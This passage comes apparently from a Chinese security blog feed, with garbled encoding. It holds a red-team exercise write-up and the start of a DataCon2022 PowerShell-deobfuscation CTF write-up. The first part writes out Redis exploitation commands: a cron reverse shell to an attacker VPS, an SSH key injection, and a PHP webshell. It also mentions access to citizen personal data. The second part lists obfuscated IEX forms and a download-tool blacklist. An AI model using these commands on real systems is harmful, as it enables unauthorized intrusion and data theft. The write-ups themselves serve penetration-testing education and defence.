    <content type="html"><![CDATA[<h1 id="æ‰“ç‚¹"><a href="#æ‰“ç‚¹" class="headerlink" title="æ‰“ç‚¹"></a>æ‰“ç‚¹</h1><p>æˆ‘ä»¬å…ˆç¡®è®¤äº†é¶æ ‡çš„çœŸå®IPï¼Œåœ¨fofaä¸­è¿›è¡Œæœç´¢ç›¸å…³çš„èµ„äº§ï¼Œç»“æœå‘ç°äº†ä¸€ä¸ªä»£ç ä»“åº“ï¼Œä¸æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œè€Œä¸”å­˜åœ¨å¼±å£ä»¤<code>admin/admin123</code>ï¼Œç›´æ¥èµ·é£ï¼Œæ‹¿åˆ°ç®¡ç†å‘˜æƒé™ï¼Œç›´æ¥çœ‹åˆ°äº†ä»£ç ï¼Œè€Œä¸”ä»æäº¤è®°å½•çœ‹ï¼Œé‚£å¤©ä¸€ç›´åœ¨æ›´æ–°ã€‚é¡ºå¸¦è¿˜å‘ç°äº†ä¸€ä¸ªVisualSVN Serveræ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼Œä¹Ÿæ˜¯å¼±å£ä»¤<code>admin/admin</code>ã€‚<br><img src="/2023/01/29/2022-11HW%E5%B0%8F%E8%AE%B0/code.png" alt="ä»£ç ä»“åº“"></p><p>æ¥ä¸‹æ¥ï¼Œå¼€å§‹ç¿»ä»£ç ã€‚æ ¹æ®ä¹‹å‰çš„ç»éªŒï¼Œä»£ç é‡Œå¾€å¾€ä¼šæœ‰<code>ç”¨æˆ·å/å¯†ç </code>å’Œ<code>ip</code>ç­‰ä¿¡æ¯ã€‚æœ€ç»ˆæ‰¾åˆ°äº†ä¸€ä¸ªredisçš„å…¬ç½‘æœåŠ¡å™¨ï¼Œå¯†ç è¿˜æ˜¯<code>redis123456</code>ï¼Œåˆæ˜¯å¼±å£ä»¤ï¼šï¼‰</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å¼€å§‹rediså†™shellï¼Œå› ä¸ºä¸çŸ¥é“redisçš„æƒé™ï¼Œæ‰€ä»¥æƒ³å…ˆåœ¨<code>/var/www/html</code>ç›®å½•ä¸‹å†™Webshellï¼Œä½†æ˜¯å†™äº†åŠå¤©ä¹Ÿæ˜¯è®¿é—®ä¸äº†ã€‚</p><p>äºæ˜¯å°±æ€€ç€ç¢°ç¢°è¿æ°”çš„å¿ƒæ€ï¼Œç›´æ¥å†™å®šæ—¶è®¡åˆ’ï¼Œæ²¡æƒ³åˆ°æ˜¯rootæƒé™ï¼Œå®Œç¾åœ°å†™è¿›å»äº†ï¼Œshellæ¥äº†ï¼ï¼ï¼</p><p>è¿™é‡Œä¹Ÿè®°å½•ä¸‹rediså†™shellæˆ–æ˜¯å†™å…¬é’¥çš„æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å†™å®šæ—¶è®¡åˆ’</span><br>redis-cli -h [ip] -a [password]<br><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron/<br>config <span class="hljs-built_in">set</span> dbfilename root<br><span class="hljs-built_in">set</span> aaa <span class="hljs-string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/[VPSIP]/9999 0&gt;&amp;1\n\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/[VPSIP]/9999 0&gt;&amp;1\n\n&quot;</span><br>save<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç”Ÿæˆå…¬é’¥ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸‹keyçš„è·¯å¾„ï¼Œä¸ºid_rsa_file</span><br>ssh-keygen -t rsaâ€‹<br><br><span class="hljs-comment"># å†™å…¬é’¥</span><br>redis-cli -h [ip] -p [port] -a [password]<br><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh/<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n\n\n\n\n[id_rsa.pub]\n\n\n\n\n&quot;</span><br>save<br><br><span class="hljs-comment"># è¿æ¥redis</span><br>ssh -i id_rsa_file root@[ip]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å†™WebShell</span><br>redis-cli -h [ip] -p [port] -a [password]<br><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/www/html<br>config <span class="hljs-built_in">set</span> dbfilename shell.php<br><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n\n\n\n\ns&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]);phpinfo(); ?&gt;\n\n\n\n\n&quot;</span><br>save<br></code></pre></td></tr></table></figure><h1 id="åæ¸—é€"><a href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h1><p>è¿™å°redisæœåŠ¡å™¨æŒºæœ‰æ„æ€çš„ï¼Œç”±äºæ˜¯å…¬ç½‘çš„redisï¼Œæ‰€ä»¥å½“æ—¶ä¸æŠ¥å¤ªå¤§çš„å¸Œæœ›åœ¨å†…ç½‘é‡Œã€‚ç»“æœåœ¨æ‰§è¡Œ<code>ifconfig</code>ï¼ŒæŸ¥çœ‹ipä¿¡æ¯çš„æ—¶å€™ï¼ŒæƒŠå–œåœ°å‘ç°åœ¨å†…ç½‘é‡Œï¼Œç ”ç©¶äº†ä¸‹å…¶ä¸­çš„åŸå› ï¼Œæ˜¯å› ä¸ºè¿ç»´äººå‘˜åœ¨è¿™å°å…¬ç½‘redisä¸Šæ­å»ºäº†FRPæœåŠ¡ã€‚</p><p>è¿™å°redisæœåŠ¡å™¨åœ¨å†…ç½‘çš„<code>192.168.2.0/24</code>è¿™ä¸ªCæ®µï¼Œè¿™ä¸ªå…¬å¸åœ¨ç½‘æ®µçš„åˆ’åˆ†ä¸Šåšçš„è¿˜ä¸é”™ï¼Œæ‰«æäº†ä¸€ä¸‹ã€‚</p><p>æ¥ä¸‹æ¥åˆæ˜¯ä¿¡æ¯æ”¶é›†ï¼Œå…ˆæ˜¯å¼±å£ä»¤æ‹¿ä¸‹<code>192.168.2.0/24</code>æ®µä¸‹18å°æ•°æ®åº“æƒé™ï¼Œæ•°æ®åŒ…æ‹¬ä¸€äº›äº¤æ˜“çš„é‡‘é¢ã€äº¤æ˜“å•ä½ã€äº¤æ˜“è´¦æˆ·ç­‰ï¼Œè¿˜æœ‰å…¬æ°‘ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰‹æœºã€èº«ä»½è¯ã€ä½æ‰€ç­‰ï¼Œæ€»è®¡çº¦æœ‰60Wæ¡ã€‚<br><img src="/2023/01/29/2022-11HW%E5%B0%8F%E8%AE%B0/data.png" alt="data example"></p><p>ç»§ç»­ä»ä»£ç ä»“åº“é‡Œæ‰¾<code>ip</code>å’Œ<code>ç”¨æˆ·å/å¯†ç </code>ï¼Œä¹Ÿæ˜¯å¾ˆæœ‰æ”¶è·ï¼Œåˆæ‰¾åˆ°äº†<code>192.168.10.0/24</code>çš„ä¸€äº›æ•°æ®åº“ipå’Œå¯†ç ï¼Œ</p><p>æœ€æœ‰ä»·å€¼çš„æ˜¯æ‰¾åˆ°äº†MinIOæœåŠ¡å™¨çš„<code>AccessKey/SecretKey</code>ï¼Œè‡³æ­¤å¯ä»¥è¯´æ˜¯æ‹¿ä¸‹äº†<code>192.168.2.0/24</code>æ‰€æœ‰çš„è®¾å¤‡ã€‚<br><img src="/2023/01/29/2022-11HW%E5%B0%8F%E8%AE%B0/MinIO.png" alt="MinIO information"></p><p>ç„¶è€Œç”±äºæˆ‘ä»¬çš„ä»£ç†æ˜¯ç”¨msfconsoleæ­å»ºçš„ï¼Œäº”å…­åˆ†é’Ÿå°±ä¼šæ–­ä¸€æ¬¡ï¼Œå°±æ²¡æœ‰è¿›è¡Œè·¨ç½‘æ®µçš„å°è¯•ã€‚</p><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯redisæœåŠ¡å™¨ä¸å¤Ÿç¨³å®šï¼Œåæ¥è·Ÿå¤§ä½¬äº¤æµåå‘ç°æ˜¯msfconsoleçš„ä»£ç†çš„é—®é¢˜ï¼Œï¼ˆè¿™æ¬¡HVVæ²¡æœ‰å¤§ä½¬åœ¨ç°åœºï¼Œè¯´ä¸å®šå°±æ‰“ç©¿äº†ï¼‰ï¼Œåˆ°äº†ç¬¬äºŒå¤©ä¸‹åˆçš„æ—¶å€™ï¼Œè¿™ä¸ªå…¬å¸è¢«åˆ«çš„çº¢é˜Ÿæ‰“ç©¿äº†ï¼Œåªèƒ½è¯´å¯æƒœäº†è¿™ä¸ªä¸é”™çš„å®è·µæœºä¼šã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ¬¡HVVæˆ‘ä»¬è¿æ°”æŒºå¥½ï¼Œç¬¬ä¸€å¤©å°±æ‰¾åˆ°äº†çªç ´å£ï¼Œä½†æ˜¯ç”±äºåˆšæ¥è§¦æ¸—é€ï¼Œä¸€äº›å·¥å…·å’Œæµç¨‹éƒ½ä¸å¤ªç†Ÿæ‚‰ï¼Œå¯¼è‡´æ¨è¿›ç¼“æ…¢ã€‚æœ¬æ¬¡æ¸—é€ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„æŠ€å·§ï¼Œè¿˜æ˜¯å¸Œæœ›èƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨shiroã€log4j2æˆ–æ˜¯fastjsonçš„çªç ´å£ã€‚</p><p>åæ¥ä¹Ÿæ˜¯ä¸€æ ·çš„æ–¹æ³•ï¼Œä»android APPé‡Œé€†å‡ºäº†ä¸€ä¸ªä»£ç ä»“åº“çš„ç”¨æˆ·åå¯†ç ï¼Œé‡Œé¢çš„å†…å®¹ä¹Ÿæ˜¯æä¸ºä¸°å¯Œï¼Œä½†æƒé™æ˜¯å…¶ä»–çœä»½åœ°åŒºçš„é¡¹ç›®ç®¡ç†å‘˜ï¼Œä¹Ÿå°±ä¸å†æ·±ç©¶ã€‚</p><p>è¿™æ¬¡æˆåŠŸå…¥ä¾µçš„é¶æ ‡ä¸»è¦é—®é¢˜è¿˜æ˜¯å¼±å£ä»¤ï¼Œä»¥åŠä¸€äº›è®¿é—®æƒé™çš„é…ç½®å¤±è¯¯ï¼Œè¿™ç±»çš„é—®é¢˜å±äºæ˜¯ä¼ä¸šçš„ä¸€äº›é€šç—…ï¼Œåªæ˜¯æ‰“è¿‡å‡ æ¬¡HVVçš„æˆ‘ä¹Ÿé‡åˆ°å¥½å‡ ä¸ªç±»ä¼¼çš„æ¡ˆä¾‹äº†ï¼Œåº”è¯¥å°½é‡æŠŠä»£ç ä»“åº“ã€redisæ•°æ®åº“ç­‰æœåŠ¡ç½®äºå†…ç½‘ä¹‹ä¸­ï¼Œè®©å‘˜å·¥ä½¿ç”¨VPNè¿›è¡Œè®¿é—®ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DataCon2022è½¯ä»¶å®‰å…¨èµ›é“WriteUp</title>
    <link href="/2023/01/28/DataCon2022WriteUp/"/>
    <url>/2023/01/28/DataCon2022WriteUp/</url>
    
    <content type="html"><![CDATA[<h1 id="DataCon2022è½¯ä»¶å®‰å…¨èµ›é“WriteUp"><a href="#DataCon2022è½¯ä»¶å®‰å…¨èµ›é“WriteUp" class="headerlink" title="DataCon2022è½¯ä»¶å®‰å…¨èµ›é“WriteUp"></a>DataCon2022è½¯ä»¶å®‰å…¨èµ›é“WriteUp</h1><h1 id="Powershellåæ··æ·†-Level01"><a href="#Powershellåæ··æ·†-Level01" class="headerlink" title="Powershellåæ··æ·†-Level01"></a><strong>Powershellåæ··æ·†-Level01</strong></h1><h1 id="ä¸€ã€é¢˜ç›®ä»‹ç»"><a href="#ä¸€ã€é¢˜ç›®ä»‹ç»" class="headerlink" title="ä¸€ã€é¢˜ç›®ä»‹ç»"></a>ä¸€ã€é¢˜ç›®ä»‹ç»</h1><h2 id="1-1-é¢˜ç›®èƒŒæ™¯"><a href="#1-1-é¢˜ç›®èƒŒæ™¯" class="headerlink" title="1.1 é¢˜ç›®èƒŒæ™¯"></a>1.1 é¢˜ç›®èƒŒæ™¯</h2><p>PowerShellæ˜¯æ”»å‡»è€…å¸¸ç”¨çš„è„šæœ¬ï¼Œé€šå¸¸å¸¦æœ‰å¤§é‡çš„æ··æ·†ï¼Œå¯¼è‡´æ£€æµ‹ã€åˆ†æååˆ†å›°éš¾ã€‚é€‰æ‰‹é€šè¿‡åˆ†æä¸»åŠæ–¹æä¾›çš„æ··æ·†PowerShellæ–‡ä»¶ï¼Œå°è¯•åæ··æ·†å¾—åˆ°PowerShellæ ·æœ¬ä¸­é¢„å…ˆæ¤å…¥çš„flagã€‚</p><h2 id="1-2-é¢˜ç›®è¦æ±‚"><a href="#1-2-é¢˜ç›®è¦æ±‚" class="headerlink" title="1.2 é¢˜ç›®è¦æ±‚"></a>1.2 é¢˜ç›®è¦æ±‚</h2><p>PowerShellæ ·æœ¬æ•°æ®é›†åŒ…å«åˆ©ç”¨å„ç§æ··æ·†æ‰‹æ®µæ··æ·†åçš„PowerShellæ ·æœ¬1000ä¸ªï¼Œé€‰æ‰‹éœ€è¦å¼€å‘è‡ªåŠ¨åŒ–åˆ†æå·¥å…·ï¼Œæå–å…¶ä¸­æ¤å…¥çš„flagã€‚</p><p>æ•°æ®é›†åˆ†ä¸¤ä¸ªé˜¶æ®µå‘æ”¾ï¼Œç¬¬ä¸€é˜¶æ®µæ•°æ®é›†AåŒ…å«800ä¸ªåŸºäºéæ¶æ„æ ·æœ¬æ”¹é€ çš„æ ·æœ¬ï¼Œç¬¬äºŒé˜¶æ®µæ•°æ®é›†BåŒ…å«200ä¸ªç‰¹æ®Šè®¾è®¡çš„æ··æ·†æ ·æœ¬ï¼Œå…¶ä¸­åŒ…å«å®é™…çš„æœ‰æ½œåœ¨ã€ç ´åæ€§ã€‘çš„æ¶æ„æ ·æœ¬æ”¹é€ çš„æ ·æœ¬ã€‚å› æ­¤é€‰æ‰‹éœ€åœ¨å¯æ§çš„éš”ç¦»ç¯å¢ƒä¸­è¿›è¡Œåˆ†ææµ‹è¯•ï¼Œè§„é¿æ½œåœ¨çš„å®‰å…¨å¨èƒã€‚</p><h2 id="1-3-æ•°æ®è¯´æ˜"><a href="#1-3-æ•°æ®è¯´æ˜" class="headerlink" title="1.3 æ•°æ®è¯´æ˜"></a>1.3 æ•°æ®è¯´æ˜</h2><p>å…¬å¼€æ•°æ®é›†ä¸­æ¯ä¸ªæ–‡ä»¶ä»¥æ ·æœ¬å†…å®¹çš„sha256å€¼å‘½åï¼Œæ²¡æœ‰åç¼€ï¼Œæ–‡ä»¶å†…å®¹ä¸ºæ··æ·†è¿‡çš„PowerShellæ–‡ä»¶ã€‚æ ·æœ¬æ–‡ä»¶ä¸­çš„flagæ ‡è®°å½¢å¼ä¸ºï¼šâ€ip:255.255.255.255â€œï¼ˆä¸åŒ…æ‹¬å‰ååŒå¼•å·ï¼Œå‰ç¼€ç»Ÿä¸€ä¸ºip:ï¼Œç´§è·Ÿçš„æ•°å­—ä¸ºåˆæ³•IPåœ°å€èŒƒå›´å†…å¯å˜å€¼ï¼‰ã€‚</p><p>âš ï¸æ³¨æ„äº‹é¡¹ï¼šä¸€ä¸ªæ ·æœ¬åªåŒ…å«ä¸€ä¸ªflagï¼ŒåŒä¸€ä¸ªæ ·æœ¬æäº¤å¤šä¸ªflagï¼Œç³»ç»Ÿåªä¼šæ ¹æ®ç¬¬ä¸€ä¸ªflagåˆ¤åˆ†ã€‚</p><h1 id="äºŒã€è§£é¢˜æ€è·¯"><a href="#äºŒã€è§£é¢˜æ€è·¯" class="headerlink" title="äºŒã€è§£é¢˜æ€è·¯"></a>äºŒã€è§£é¢˜æ€è·¯</h1><h2 id="2-1-æ ·æœ¬åˆ†æä¸åˆ†ç±»"><a href="#2-1-æ ·æœ¬åˆ†æä¸åˆ†ç±»" class="headerlink" title="2.1 æ ·æœ¬åˆ†æä¸åˆ†ç±»"></a>2.1 æ ·æœ¬åˆ†æä¸åˆ†ç±»</h2><aside>ğŸ’« åè¯è§£æï¼š<p>IEXï¼šInvoke-Expressionçš„ä»£ç§°ï¼Œæ˜¯PowerShellåœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè¿è¡Œå‘½ä»¤æˆ–è¡¨è¾¾å¼</p><p>æ¨¡æ‹Ÿæ‰§è¡Œï¼šå°†PowerShellè„šæœ¬è½½å…¥PowerShellä¸­ç›´æ¥è¿è¡Œï¼Œå¾—åˆ°è¿è¡Œç»“æœçš„æ“ä½œ</p></aside><p>åœ¨å¯¹é¢˜ç›®é€æ¸æ·±å…¥åï¼Œæˆ‘ä»¬å‘ç°å¤§éƒ¨åˆ†çš„æ ·æœ¬éƒ½å­˜åœ¨IEXæŒ‡ä»¤ã€‚åŒæ—¶ç»è¿‡æµ‹è¯•ï¼Œæˆ‘ä»¬å‘ç°å¾ˆå¤šæ ·æœ¬å†å»é™¤IEXæŒ‡ä»¤åï¼Œç›´æ¥è½½å…¥PowerShellä¸­è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œä¸€æ¬¡æˆ–è‹¥å¹²æ¬¡ï¼Œå³å¯å¾—åˆ°éšè—çš„flagã€‚è€ŒIEXä¹Ÿå¹¶éä¸ºå¯è¯»æ˜æ–‡çš„å½¢å¼ï¼Œå¾€å¾€ä¹Ÿå­˜åœ¨è¢«æ··æ·†çš„ç°è±¡ï¼Œäºæ˜¯æˆ‘ä»¬ä»æ ·æœ¬å’Œç½‘ç»œä¸­æ”¶é›†äº†ä¸€äº›IEXçš„å˜å½¢ï¼Œå½¢æˆIEXè¯†åˆ«åå•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;IEX&#x27;</span>, <span class="hljs-string">&#x27;Invoke-Expression&#x27;</span>,<br><span class="hljs-string">&quot;$ShellId[1]+$ShellId[13]+&#x27;x&#x27;&quot;</span>,<br><span class="hljs-string">&quot;$PSHome[4]+$PSHome[30]+&#x27;x&#x27;&quot;</span>, <br><span class="hljs-string">&quot;$PSHome[21]+$PSHome[30]+&#x27;x&#x27;&quot;</span>, <br><span class="hljs-string">&quot;$PSHome[4]+$PSHome[34]+&#x27;x&#x27;&quot;</span>, <br><span class="hljs-string">&quot;$PSHome[21]+$PSHome[34]+&#x27;x&#x27;&quot;</span>, <br><span class="hljs-string">&quot;$env:ComSpec[4,15,25]-Join&#x27;&#x27;&quot;</span>, <br><span class="hljs-string">&quot;$env:ComSpec[4,24,25]-Join&#x27;&#x27;&quot;</span>,<br><span class="hljs-string">&quot;$env:ComSpec[4,26,25]-Join&#x27;&#x27;&quot;</span>, <br><span class="hljs-string">&quot;(Get-Variable&#x27;*mdr*&#x27;).Name[3,11,2]-Join&#x27;&#x27;&quot;</span>, <br><span class="hljs-string">&quot;(GV&#x27;*mdr*&#x27;).Name[3,11,2]-Join&#x27;&#x27;&quot;</span>, <br><span class="hljs-string">&quot;(Variable&#x27;*mdr*&#x27;).Name[3,11,2]-Join&#x27;&#x27;&quot;</span>,<br><span class="hljs-string">&quot;$VerbosePreference.ToString()[1,3]+&#x27;x&#x27;-Join&#x27;&#x27;&quot;</span>, <br><span class="hljs-string">&quot;([String]`$VerbosePreference)[1,3]+&#x27;x&#x27;-Join&#x27;&#x27;&quot;</span>,<br><span class="hljs-string">&quot;(Variable &#x27;*mdr*&#x27;).Name[3,11,2]-Join&#x27;&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶åœ¨è¯†åˆ«è¿‡ç¨‹ä¸­ï¼Œä¸ºåº”å¯¹éƒ¨åˆ†å­—ç¬¦ä¸²æ··æ·†çš„æƒ…å†µä¼šå°†<code>+</code>ã€<code>&quot;</code>ã€<code>&#39;</code>ã€&#96;`&#96;ç­‰å­—ç¬¦å»é™¤ï¼Œä»¥æ›´å¤šåœ°åŒ¹é…IEXæŒ‡ä»¤ã€‚</p><p>æ ¹æ®ä»¥ä¸Šå‘ç°ï¼Œæˆ‘ä»¬ä»¥å¯è¯†åˆ«IEXçš„æ•°é‡å’Œä½ç½®ä¿¡æ¯ä¸ºåˆ†ç±»ä¾æ®ï¼Œå°†800ä¸ªæ•°æ®è¿›è¡Œå¦‚ä¸‹åˆ†ç±»ï¼š</p><ul><li>æ— å¯è¯†åˆ«IEXçš„æ ·æœ¬<ul><li>é€šè¿‡å­—ç¬¦è¿ç®—æ··æ·†IEXçš„æ ·æœ¬</li><li>æ¨¡æ‹Ÿæ‰§è¡Œåå­˜åœ¨IEXçš„æ ·æœ¬</li></ul></li><li>å­˜åœ¨å¯è¯†åˆ«IEXçš„æ ·æœ¬<ul><li>IEXæŒ‡ä»¤ä½äºæ ·æœ¬é¦–å°¾çš„æ ·æœ¬</li><li>IEXæŒ‡ä»¤ä½äºæ ·æœ¬ä¸­é—´çš„æ ·æœ¬</li></ul></li></ul><h2 id="2-2-æ€»ä½“æ€è·¯"><a href="#2-2-æ€»ä½“æ€è·¯" class="headerlink" title="2.2 æ€»ä½“æ€è·¯"></a>2.2 æ€»ä½“æ€è·¯</h2><p>ç»è¿‡åˆæœŸå¯¹PowerShellæ··æ·†ä¸åæ··æ·†çš„å¤šæ–¹è°ƒç ”ï¼Œå€Ÿé‰´phpåæ··æ·†çš„æ€è·¯ï¼Œç»“åˆé™æ€è§„åˆ™åŒ¹é…ã€åŠ¨æ€æ‰§è¡Œä»¥åŠASTè¯­æ³•æ ‘ç­‰æŠ€æœ¯ï¼Œæœ€ç»ˆæ€»ç»“å‡ºæœ¬é¢˜çš„è§£é¢˜æ€è·¯ã€‚</p><p>é¦–å…ˆè·æå–æ ·æœ¬ä¸­IEXæ•°é‡ã€ä½ç½®ç­‰ä¿¡æ¯ï¼Œå¯¹æ ·æœ¬è¿›è¡Œåˆ†ç±»ã€‚å¯¹ä¸åŒç±»åˆ«çš„æ ·æœ¬ï¼Œåˆ†åˆ«è¿›è¡Œåæ··æ·†å¤„ç†ï¼Œå…·ä½“çš„åæ··æ·†æ–¹å¼æœ‰ä¸¤ç§ï¼šä¸€æ˜¯å¯¹æ•´ä¸ªæ ·æœ¬æˆ–æ˜¯å¯¹æ ·æœ¬ä¸­çš„æŸä¸€è¡Œã€æŸä¸€å‚æ•°å€¼è¿›è¡Œå¾ªç¯å»é™¤IEXå†æ¨¡æ‹Ÿæ‰§è¡Œï¼ŒäºŒæ˜¯åˆ©ç”¨Invoke-Deobfuscationå·¥å…·ä¸­çš„ASTè¯­æ³•æ ‘å¯¹æ ·æœ¬è¿›è¡Œåˆ†æã€åæ··æ·†ã€‚</p><p>è§£é¢˜æ€è·¯çš„ç¤ºæ„å›¾ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled.png" alt="è§£é¢˜æ€è·¯"></p><h2 id="2-3-å…·ä½“æ€è·¯"><a href="#2-3-å…·ä½“æ€è·¯" class="headerlink" title="2.3 å…·ä½“æ€è·¯"></a>2.3 å…·ä½“æ€è·¯</h2><h3 id="2-3-1-å¾ªç¯å»é™¤IEXåæ··æ·†"><a href="#2-3-1-å¾ªç¯å»é™¤IEXåæ··æ·†" class="headerlink" title="2.3.1 å¾ªç¯å»é™¤IEXåæ··æ·†"></a>2.3.1 å¾ªç¯å»é™¤IEXåæ··æ·†</h3><p>å¾ªç¯å»é™¤IEXåæ··æ·†æ–¹æ³•ï¼Œæ˜¯é’ˆå¯¹IEXä½äºæ ·æœ¬é¦–å°¾çš„æƒ…å†µã€‚é€šè¿‡å¾ªç¯å»é™¤é¦–å°¾IEXå†æ¨¡æ‹Ÿæ‰§è¡Œçš„æ–¹æ³•è·å–æœ€ç»ˆflagï¼ŒåŒæ—¶æˆ‘ä»¬é€šè¿‡è®¾ç½®é»‘åå•çš„æ–¹å¼é˜²å¾¡æ¶æ„ä»£ç ã€‚å…·ä½“çš„ä»£ç é€»è¾‘å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> check(content):  <span class="hljs-comment"># contentä¸ä¸ºç©º &amp;&amp; ä¸ä¸è¿›å…¥å¾ªç¯å‰ç›¸åŒ ä¸ºTrue</span><br>iex_number, iex_location = get_iex_info(content) <span class="hljs-comment"># è·å–æ ·æœ¬ä¸­IEXæ•°é‡ã€ä½ç½®ç­‰çš„ä¿¡æ¯</span><br><span class="hljs-keyword">if</span> iex_number &gt; <span class="hljs-number">0</span>:<br>content = delete_iex(content, iex_location)  <span class="hljs-comment"># æ£€æŸ¥IEX</span><br>content = decode(content, timeout)  <span class="hljs-comment"># è°ƒç”¨decodeæ–¹æ³•è¿›è¡Œåæ··æ·†</span><br>has_flag = check_flag(content, timeout)  <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰flag</span><br><span class="hljs-keyword">if</span> has_flag:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>content = decode(content, timeout) <span class="hljs-comment"># è°ƒç”¨decodeæ–¹æ³•è¿›è¡Œåæ··æ·†</span><br>has_flag = check_flag(content)  <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰flag</span><br><span class="hljs-keyword">if</span> has_flag:<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œå®é™…æ£€æµ‹ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå‘ç°äº†ä¸€äº›æ¶æ„æ–‡ä»¶ä¸‹è½½ã€ç³»ç»Ÿé…ç½®ä¿®æ”¹ç­‰æ¶æ„è¡Œä¸ºã€‚ä¸ºäº†å‡å°‘è¿™ä¸ªæ¶æ„è¡Œä¸ºå¯¹è‡ªåŠ¨åŒ–æ£€æµ‹çš„å½±å“ï¼Œæˆ‘ä»¬è®¾å®šäº†ä¸€ä¸ªç®€å•çš„é»‘åå•è¿›è¡Œé˜²å¾¡ï¼Œå…·ä½“é»‘åå•å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">install, http, iwr, curl, <span class="hljs-type">Set</span>-AzSecurity, find<br></code></pre></td></tr></table></figure><h3 id="2-3-2-é€è¡Œåˆ†æ"><a href="#2-3-2-é€è¡Œåˆ†æ" class="headerlink" title="2.3.2 é€è¡Œåˆ†æ"></a>2.3.2 é€è¡Œåˆ†æ</h3><p>é€è¡Œåˆ†æï¼Œé’ˆå¯¹çš„æ˜¯IEXåœ¨æ ·æœ¬ä¸­é—´çš„æƒ…å†µã€‚å°†æ ·æœ¬è¿›è¡Œåˆ†è¡Œå¤„ç†ï¼Œå¯»æ‰¾å¯èƒ½å­˜åœ¨flagçš„è¡Œï¼Œæˆ‘ä»¬å°†å…¶è½½å…¥powershellæ¨¡æ‹Ÿæ‰§è¡Œï¼Œåœ¨æ ‡å‡†è¾“å‡ºä¸­æŸ¥æ‰¾flagä¿¡æ¯ï¼Œè‹¥æ²¡æœ‰æŸ¥æ‰¾åˆ°flagï¼Œæˆ‘ä»¬ä¼šåˆ†æè¯¥è¡Œæ˜¯å¦ä¸ºèµ‹å€¼è¯­å¥ï¼Œå¯¹èµ‹å€¼è¯­å¥ä¸­çš„å‚æ•°å€¼è¿›è¡Œæå–ï¼Œåå°†å…¶è½½å…¥powershellæ¨¡æ‹Ÿæ‰§è¡Œï¼Œæœ€ç»ˆæå–flagã€‚å…·ä½“çš„é€»è¾‘å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 